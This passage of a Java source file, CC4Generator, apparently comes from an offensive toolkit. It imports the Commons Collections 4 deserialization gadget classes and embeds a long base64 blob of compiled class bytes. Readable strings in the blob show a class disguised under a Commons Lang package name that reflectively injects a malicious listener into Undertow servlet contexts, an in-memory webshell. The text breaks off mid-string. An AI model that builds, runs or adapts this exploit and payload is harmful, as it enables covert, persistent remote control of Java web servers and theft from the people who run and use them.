package org.ppp.tools.ser;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.ppp.tools.ClassFiles;
import org.ppp.tools.Reflections;
import org.ppp.tools.encryption.B64;

import javax.xml.transform.Templates;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.PriorityQueue;

/**
 * @author Whoopsunix
 */
public class CC4Generator {
    public static void main(String[] args) throws Exception{
        B64 b64 = new B64();
//        String base64Str = b64.encodeObj(cc4Demo(b64.encodeJavaClass(Calc.class)));
        String b64Str = "yv66vgAAADEBagEAKW9yZy9hcGFjaGUvY29tbW9ucy9sYW5nL3lsL1NpZ25hdHVyZVV0aWxzBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEADGdldENsYXNzTmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAEQ29kZQEAMG9yZy5zcHJpbmdmcmFtZXdvcmsuU2VydmxldENvbnRleHRYdnlucXhMaXN0ZW5lcggACAEAD2dldEJhc2U2NFN0cmluZwEACkV4Y2VwdGlvbnMBABNqYXZhL2lvL0lPRXhjZXB0aW9uBwAMAQAQamF2YS9sYW5nL1N0cmluZwcADgER/Eg0c0lBQUFBQUFBQS81VllDWHhVMWJuL2Y1bEo3bVF5SUdRa0VKRkZRTWcrQkFsTEFDc0pDVVNURVFtZ2dWcTltZHdrSTVPWlllWk9JRnFyRm1zMzIyb1hyVzN0WmkybEswcWRFR2twN2V2eXV1Lzc5dmErdHUvMVBkOXI3VXJUL3puM3pwQkpKa0ovd0wxM3p2blcvN2VjNy9DbHZ6NTdGa0N6REFuV0psSkRvWFF5RlkwUERhYk1FZXRJSW5VbzFHdWxSbU9XM1o2STI5WlIrNWJSc2ZqaG85M1J0RzNGclpRQkVTeTR3eHcxUXpFelBoUnFqNW5wZEhmQ0hGQmJIc0VxdFhVMGxIWkU1RVR0c1E1bnJMUjlRVWlwb0d4ck5CNjFyeFY0YW1yM0M3enRpUUZMY0ZsM05HNkZNeVA5Vm1xdjJSL2pTbVYzSW1MRzlwdXBxUHJ0TG5ydDRXaGFzSzc3NzdWL1N3QUdmSDU0TVZkd1JVMTNVVSsyS0lQa1RzSENXZmFWa0hsS1NKQTBGMGg2YldWSVd5WWEwM0FzOEtOS3FmRW15YWtjbVU1Sk9ZdFFYWTRTWEVFOHpHVFNpZzhJR210bUV0Yk9XSEsxVU1TVldLSVVMU1dTaDZ5eEFKWTdJcThTK095RVF5eTR2R2FtQ1BLdXhDckZlelY1UndaYUJLc3ZTVGNaMTZER1R5VzE2a3VycXhlVTd0dmIyYmpKaDBaQlNTUWRRTWpaV1Vzc2IyTFMxQnhzcTUyTzV4WkYycy9Id1RaQnhZQTF5T2pyRGVKSytxNnVtUndCYk1CR2hmMG15ajBxTUVoM29GYnhCeStRZGh5TldFazdtb2diMkVxeUNOVjNPNWtaU1kwbDdVU29QWm9jSm5vTXpxaVpXcC9ibnNiTWJhRWxNc0ovQnd5MHVDcW1DVEhRS1pqVGE1dVJRejFtMGsxUXovYU9YaCs2Nk5TUVpYZkYwN1laajNDNWRsWjhwMXNXd0EzbzltTW5lZ1RMQ2dqU1NTdkNISStrTFBzR2E2eVh2d3pjS0pnM1hiQUJvdTZqK3JZeDI2SWIzaHFpRkVBdjl2cXhCL3NjaEl1WXMxOWw5ODErN01ZdFpGSkZxa2k3SE1xMEZjbWtvdlpZaUtvMTZRRWNWRmErbUlFWVNIUkc0MmFNcWF4Q3JYUzlCTGVwemR0cFhjcHBBVHY0TDVVWXN3Ynl1VFpicytnWXRlSzJyc1JnZXVhR1lPVWxjTFBvWEwxZGRDTnF4cUozS3MxbFppcDFZNFl5bGpsT1JSTWhoZEgyVk1vYzQzb3lZeE1MeXh4UjhSOHNMTndiKysrd0lrcXdMMldsazRsNG1rR2Q3c2V3YlNkRHUvakltK1JRa3N0SVcrazBNMHV3ZkhZbVRhRlNjOEMwVGZLNExnaldYRlNSSmlUclZSZkZ4a0JLY1BVbHlUTkEzYXN2elVjRG80S2xMK3lhQVpidGZDWm1vUnBpVWxQN2drRmxVZHlKdS94STQ2VUMvN0NsZW5HWVhUK0Fsem10NWg1Qk9lWHUwanNCM0llYUNtVHdjbGFoUTd6ZmpHVklmYjlEL1FwR01jSkR3b3pHV1I2TEN3NkRZVFBWcTVTeWFyZlVIZ2pnbFhpVnFwcFhDNnFHTG5qYm1VcU01SzIvNmVKNTRIZ3gzY2xaOHlXQTErSkIxV1pmUjNjMVhtN3lySmdCMUl6MENlQU5lRWg1LzdBZ1FON2Rwam9mYlFYTG14eFkzc3lOZmpOdGJWaS93NHJvdzdlcVdIZFNkZndJSGxWbXZEV0FWbXhSWDI5aldpYk5zUmlQUXgvZTRXallicE9qUDJOYkZ6OUczQ29LNEoxNFZ3WEc4TzZDOXVYc0duaXYwNzdjOHlCWVUrd3NlQitlOU9NSnZKK1R3N1JOQXg4UXpNM3hPd2Uzb0hxbWxQeVova0Y4eUk4VCtMQnlNQmpBT2x5anZqNUc3OUlGM3EwcDR0MU01MVJ6ZkFwUEsvZE9NWHpKSFA1cEg1NVI4SE54eVF0Mkh3T24vWmhRQTBSRjNEcHk0UXdwUE1yelVKN0JKNVQxbjJSN1k1NlpzYlE2Y291WXhXVCtGTTRwMEQ3dFZNdk43T2NLbW9VNXVUUm9ONTF5TnlqNkgvRFpDaHpCNTBpZnp2U24zWkdpcXFid2VNN1BCbC9BUDZwYStXTHVSQzZVWitETEhCV09xTzlwRms0NWdMNktyL254Rlh4ZG1jbmhwTUpPNUNFSzRGdnFCSnZBdC9QNTJ4SFA1Vy9oaUpHMzZMdjRuZ3JsOTVYQzJXeitvYkw1UjlRMUdNdWtoOXN5ZzRPcVZuNENuM0w5cDR4Z2Zpd2dzajdyYUdTWUFpd2Yvb25lRU1WT0hsU2JpdUI5aVlYd0wvaFhaZUcvVWI5cGM1UVlIbUdQWnFyOEIwY0xUWjZ4bzdFUTV3c0QvOGtJYzlEcnRkaHo1dWRpcHJlNVJGRy93cThyOEV2OFZ3RW50d3o4aGxWckp6U0tDb25hZzhVcytWODhWNEgvd2Y5eGhobFNLbFlYUzZKaWpML0Y3NVRlNXltNnNPRzVnN2dQZjJDVnBndDduQTkvY3M4TFIxbzQwWnVKREhkR3JkakFsQm51TDg2YzFwSTdObWVuZFNlNnRjNnIyWG10WTkxUDRVdFpnekdhSE5LY0xzTTF4TExJY0xwd0ZpNUR5dGl5aUE5Ylo4eE1XUU42OWVLemU2SHFnUGlrbkVVcmZzWks5ZmRNMGtwRmxPcUFCRlJqT3lGejFEREdXamd2bDVGRzlhRklSSFY0NXhaVWM0REZJdk9sMGkrR0JQbFE2QytaTnFuMWtONGNzblpFaDV6WndKTlNZZlgwN0dqeHlTS2VleTlBYlFndkpzMnorelNMRHM2dWNxVmZGc3NTcG1yTWlnL1p3L3FhMXhXUVpiS2NkU2E4bkpSbGtweHZMR2VBWnllaEl5dGxsZUppd1YrdXhZK1k5bkNvTFRyVXhmd1pZdWVRTldRYjBEb0NVc3N1UU9JNk5XNTJzZTdWMkNvTmZxbVJSbld2K2FINkN1bldzWThYcTFRN08wVkFtdFY5WjQ4d0lReW5hYkR2bFRsTnhNbUREYnlMOUxQQVMwZlZxT0FlUzAycWhKcmFOSmxQTnBONU1LRUhEMDVRRndtNGUwN0pGdG1xd3JuTk9jaGQzVDU1RWFmTGd6UElEZG51dE9ZZXl4NU9NSzJ1SzZKbEpsdXhSSE1rMElCMjJhRU02R0JUTGxMMmh1d1VMSnFOM1JCZVpNcWk4ZEhFSWJxOHVVaERLQ0t5V0krUUc2VGJMOWNMN3pSekxZM0JYdmVHNmhOZVlhclNtWGpUU0RRZGFXcmIzdHVSNit1RTZTWjFxT2tmUHVsVk53M0xqWjNmS1VHSGFyL0tEc3VodW1XbXREemRBUjRjRHAzVDVYM0MyNHR2YXlUbS9vZUVzVDBaT1RwbW16NjVqUW13dG1WalpLQmwzZnJOMXZySXdOcDFHM3pDbWR5L2ozMnNjZnNRbTdSUDNTN0xkaDhlaXZTbmZXTGhLclp4TDdqRVB6NTFPd1pRcnU3Q2ZQdlVmVisvbCt1M3FNRlZ2Ky9YN3dDL0RPNHkrdnkxblpLRTcyRGRPQzZyQzhyQU03aVhyOEZuOE1CVFhDNkJuMDkxYWdCTFVZbGxxSEJGa0lYdk9WcXdnWG11dUF3cEZXMUxYZjA0TGkrVWR3WlZmZU5ZK0RRV1o3SHNhYXpnTTR2VnAxRjNDZzJWVGFmUWZFRmhKYjBEVmxERlNucTFDdXR4dFZaYzVRaDNGYXV2K2FUbERVb05VcTRKMjhpcnFNcnI2ajMxWjhleCtXUmViSm0ydTJhS3FQSzhxSElxYWRHaU9INjZvcjVQRG1WSWZlWDFweEVPTjE3NUdBenZjWGhMejJCM24vWmdmK1gxNCtqTDR0YkcraXpNazJFNXFWV3NvWkp0OEdpbFZTamxzNUdpbXVoUmlEdHJVWXRtYmNSNjdwVng5VnE4aU5TMU5PazZSc1NqVk9ZTnEwZWJOa3g5dFdNSGFYYnhleXM4azdnTVhnTWxCanJZbEhkQ1BTYTVOWFdOSHp0bEVndmhjUmNWMVRaSzYwZkVkYkpGdzhNd1BqVU5wdzFUY0pLOE9ZSUJXQnFud1p3SStRWGQ4SEh2ZVlKdzl6bGtlaHJxUG81N0ozQ3NCSi9IenkvODRNY0RXYnptTVh5NXJtRWNydzgzVE9DTnhOdmJ3SnlZd0Z0S2NCcVB0WmJXVlpkNnNuaDdhMm0xdC9MeENieW5oSVBUQ3ZWOUJpVjlkVmtjeitJajQvaG9kV2tXSnlmd2NRK080NjZHeW14MTZRVEdQUnhSSjVobHo3YVc1Ym5QNFVRV1oxdU5hcU82TEl2UDNGeHROS2hYNHdRK0wzZ2FEWjU1ODdMNFVoYmZxRGF5K0thN1hxZG92K09sSGFmeEErN2xxUlh4ajUyRm53bFZlOE5QRVFVZm51TnNrZ3Y1Zml6Z2N6Tlh0ekNvV3huMGJkaklJSGN3ekdHRytBQ0RQTVpnSG1NNEgrVHE0K2pFa3d6cmg5R0ZzN2dlbjhVTitCRzY4V3RTUDhlSjhiZTRDYjlEcjQ3SEhrcDlrQkVZd2pEajlEajJJb283V0lFaGZBYUhFS01GRy9Fc1JoQm41blpRWW9JQlZnbjRmRDZDejdzUjlPRTNTT0t3bTFBcjRaMmtVV1U2VDNpeHlSZzRZbUNNT1FQOEFVZmFWTnFRbEpkRlBuK3Uwb3dpdHVrTVNuREY0RHNpUGZWQi9QTnAvSHNRditEekhINFpKa3ovTFJ5ay8xL0YyYk9oZEFHamV2YTkyRnp0WFZDNnJyV3NzYnBzQXI4dkFZRVA0bzg2TnhibDFvTDRzeFp5cE9jNHl1OHZsZU9UbjJzNHFUMm9VNk1zbFNybDM2WEh5cjlOMHFOeUk5eFkrY1NUcUdJNVNnWDU1clI2RzdNeU4zeDg4bGNOWDBEZ0RNNzMxWS9MdkU4MWVMTnllVU5kVmhhb2dwMURYVlU0NzBadkhaRUNZMVNDZzNUclZ1N2V4djNiU1dHeXRmWmpDZk4rT2JOL0ZXUFFTUFRYRWY5Y01TL2l2NzlpVW5lTlRTeWlPN1M5bTRURElmV1VZSU9VaUVmRDFTeGVLYVZHaGYxOGVNL0RNTVF3Y0NKczRIeDVvQUJoMVUyY1d2MEExeno2LzlXN2cxSjlXcGF5MHRpRVBIUmtSVlpXbjVHYVBtOURWdWhpRS9OVTFtYmxtbTZtYUUvOVNhMjluaTBvbDZOTGRjaFU2QTVUZElyZXBibWZJWVhOWEJyVkhpMG5iVG5iVTdzNFhhQ1pyYWhhZDRtUUxOUWU3ZExuUU1razJaZzJlL2pYYVRCazQzM0lDWkdFbWFncVJIY3JxMXRQeTdVOURVRzVUczVKVzFZNkcvamVsUlYyVjBZdktMdTluOFNKUGs5bFJ5LzNHdm5qaVQ1UEhiL0Q1N0NIcm13SkIyV1BscUJLMmx2dDFVeDdwekpWZTJkd2xiWjZpVUNKYnEvdHRHNEgvUnZMSStIRSswN3UzazF6WDhiNDNrTzZWNUx5WGxLK25MVjRqUFYzUDNrZUlOY3JjQmRlcGRIWlJRU1hZS1dzWjVRVlRxM1N3b2lXa1BacXZlWWxaNU83dGdNYlpZUGIydStXalc3VHZVczI1VkdzVlEyOVhUZnBISXFUSlBPNnYzWFg1dU9QSkorYUc0L2dVYmNKNzNWUlBqWVY1WnVMbzl6bkFyWm5Kc29kL0V2SXJpWFFCMmNBZmV0VXZtbEF1NHdYc0c1blY5dkdNK2lseExNUWE5VkMza0NqSHlKK0Q1UHVNVksra1pSdlpyOTdDenZhSStSNUs3a2V4WDE0MnhTc1Y4cytGK3R0THE1N1VhUFh2T1JzZHRkMk1oSTVySThSYXlkajd5UFdMVk94N25RenRzUEZlcFBDV3YrZWlyVlBYcEtmbGNLNkNJQ21vTngrQ291RDBuOEtLeTVwcWhIdC9GeWFGTUFWck9iRmJCeFhBbjhEMlg5SVlpWWJBQUE9CAAQAQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDAASABMKAA8AFAEAAygpVgEAE2phdmEvbGFuZy9FeGNlcHRpb24HABcBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAhsaXN0ZW5lcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAB2NvbnRleHQBAAhjb250ZXh0cwEAEExqYXZhL3V0aWwvTGlzdDsBAAR0aGlzAQArTG9yZy9hcGFjaGUvY29tbW9ucy9sYW5nL3lsL1NpZ25hdHVyZVV0aWxzOwEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBACRMamF2YS91dGlsL0xpc3Q8TGphdmEvbGFuZy9PYmplY3Q7PjsBAA5qYXZhL3V0aWwvTGlzdAcAJAEAEmphdmEvdXRpbC9JdGVyYXRvcgcAJgEADVN0YWNrTWFwVGFibGUMABIAFgoABAApAQAKZ2V0Q29udGV4dAEAEigpTGphdmEvdXRpbC9MaXN0OwwAKwAsCgACAC0BAAhpdGVyYXRvcgEAFigpTGphdmEvdXRpbC9JdGVyYXRvcjsMAC8AMAsAJQAxAQAHaGFzTmV4dAEAAygpWgwAMwA0CwAnADUBAARuZXh0AQAUKClMamF2YS9sYW5nL09iamVjdDsMADcAOAsAJwA5AQALZ2V0TGlzdGVuZXIBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAOwA8CgACAD0BAAthZGRMaXN0ZW5lcgEAJyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspVgwAPwBACgACAEEBAA5yZXF1ZXN0Q29udGV4dAEADnNlcnZsZXRDb250ZXh0AQABaQEAAUkBAAd0aHJlYWRzAQATW0xqYXZhL2xhbmcvVGhyZWFkOwcASAEAE2phdmEvdXRpbC9BcnJheUxpc3QHAEoKAEsAKQEAEGphdmEvbGFuZy9UaHJlYWQHAE0BAApnZXRUaHJlYWRzCABPAQAMaW52b2tlTWV0aG9kAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsMAFEAUgoAAgBTAQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwwAVQBWCgBOAFcBADJpby51bmRlcnRvdy5zZXJ2bGV0LmhhbmRsZXJzLlNlcnZsZXRSZXF1ZXN0Q29udGV4dAgAWQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgcAWwEACWxvYWRDbGFzcwEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsMAF0AXgoAXABfAQAHY3VycmVudAgAYQEAGGdldEN1cnJlbnRTZXJ2bGV0Q29udGV4dAgAYwEAA2FkZAEAFShMamF2YS9sYW5nL09iamVjdDspWgwAZQBmCwAlAGcBACBqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbgcAaQEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24HAGsBACtqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uVGFyZ2V0RXhjZXB0aW9uBwBtAQAJU2lnbmF0dXJlAQAmKClMamF2YS91dGlsL0xpc3Q8TGphdmEvbGFuZy9PYmplY3Q7PjsBABNqYXZhL2xhbmcvVGhyb3dhYmxlBwBxAQAJY2xhenpCeXRlAQACW0IBAAtkZWZpbmVDbGFzcwEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAFY2xhenoBABFMamF2YS9sYW5nL0NsYXNzOwEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAtjbGFzc0xvYWRlcgEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7DAB9AH4KAE4AfwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwAgQCCCgAEAIMBAA9qYXZhL2xhbmcvQ2xhc3MHAIUBAA5nZXRDbGFzc0xvYWRlcgwAhwBWCgCGAIgMAAUABgoAAgCKAQALbmV3SW5zdGFuY2UMAIwAOAoAhgCNDAAKAAYKAAIAjwEADGRlY29kZUJhc2U2NAEAFihMamF2YS9sYW5nL1N0cmluZzspW0IMAJEAkgoAAgCTAQAOZ3ppcERlY29tcHJlc3MBAAYoW0IpW0IMAJUAlgoAAgCXCAB1BwB0AQARamF2YS9sYW5nL0ludGVnZXIHAJsBAARUWVBFDACdAHgJAJwAngEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwwAoAChCgCGAKIBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QHAKQBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwApgCnCgClAKgBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwwAqgCrCgCcAKwBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAK4ArwoApQCwAQARbGlzdGVuZXJJbmZvQ2xhc3MBAAxsaXN0ZW5lckluZm8BAA5kZXBsb3ltZW50SW1wbAEAFGFwcGxpY2F0aW9uTGlzdGVuZXJzAQAUbWFuYWdlZExpc3RlbmVyQ2xhc3MBAA9tYW5hZ2VkTGlzdGVuZXIBAAdnZXROYW1lDAC4AAYKAIYAuQEACmlzSW5qZWN0ZWQBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KVoMALsAvAoAAgC9AQAkaW8udW5kZXJ0b3cuc2VydmxldC5hcGkuTGlzdGVuZXJJbmZvCAC/AQAHZm9yTmFtZQwAwQBeCgCGAMIBAA5nZXRDb25zdHJ1Y3RvcgEAMyhbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOwwAxADFCgCGAMYBAB1qYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcgcAyAEAJyhbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAjADKCgDJAMsBAApkZXBsb3ltZW50CADNAQAFZ2V0RlYMAM8AUgoAAgDQCAC1AQAoaW8udW5kZXJ0b3cuc2VydmxldC5jb3JlLk1hbmFnZWRMaXN0ZW5lcggA0wEAEWphdmEvbGFuZy9Cb29sZWFuBwDVCQDWAJ4BABYoWilMamF2YS9sYW5nL0Jvb2xlYW47DACqANgKANYA2QgAPwEAXShMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzcztbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAUQDcCgACAN0BAA1ldmlsQ2xhc3NOYW1lAQASTGphdmEvbGFuZy9TdHJpbmc7AQAMYWxsTGlzdGVuZXJzCADhAQAEc2l6ZQEAAygpSQwA4wDkCwAlAOUBAANnZXQBABUoSSlMamF2YS9sYW5nL09iamVjdDsMAOcA6AsAJQDpCACzAQANbGlzdGVuZXJDbGFzcwgA7AEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaDADuAO8KAA8A8AEADGRlY29kZXJDbGFzcwEAB2RlY29kZXIBAAdpZ25vcmVkAQAJYmFzZTY0U3RyAQAUTGphdmEvbGFuZy9DbGFzczwqPjsBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyCAD3AQAMZGVjb2RlQnVmZmVyCAD5AQAJZ2V0TWV0aG9kDAD7AKEKAIYA/AEAEGphdmEudXRpbC5CYXNlNjQIAP4BAApnZXREZWNvZGVyCAEAAQAGZGVjb2RlCAECAQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24HAQQBAA5jb21wcmVzc2VkRGF0YQEAA291dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAJpbgEAHkxqYXZhL2lvL0J5dGVBcnJheUlucHV0U3RyZWFtOwEABnVuZ3ppcAEAH0xqYXZhL3V0aWwvemlwL0daSVBJbnB1dFN0cmVhbTsBAAZidWZmZXIBAAFuAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0HAQ8BABxqYXZhL2lvL0J5dGVBcnJheUlucHV0U3RyZWFtBwERAQAdamF2YS91dGlsL3ppcC9HWklQSW5wdXRTdHJlYW0HARMKARAAKQEABShbQilWDAASARYKARIBFwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgwAEgEZCgEUARoBAARyZWFkAQAFKFtCKUkMARwBHQoBFAEeAQAFd3JpdGUBAAcoW0JJSSlWDAEgASEKARABIgEAC3RvQnl0ZUFycmF5AQAEKClbQgwBJAElCgEQASYBAAVzZXRGVgEAOShMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL09iamVjdDspVgEABHZhcjABAAR2YXIxAQADdmFsAQAEZ2V0RgEAPyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwwBLQEuCgACAS8BABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAcBMQEAA3NldAwBMwBACgEyATQBAANvYmoBAAlmaWVsZE5hbWUBAAVmaWVsZAEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsKATIAqAwA5wA8CgEyATsBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24HAT0BACBMamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsMAUABQQoAhgFCAQANZ2V0U3VwZXJjbGFzcwwBRACCCgCGAUUKAT4AFAEADHRhcmdldE9iamVjdAEACm1ldGhvZE5hbWUBAAdt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